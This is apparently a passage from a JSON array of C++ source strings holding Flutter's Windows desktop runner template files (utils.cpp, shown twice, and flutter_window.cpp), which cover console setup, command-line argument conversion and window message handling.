    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n"
]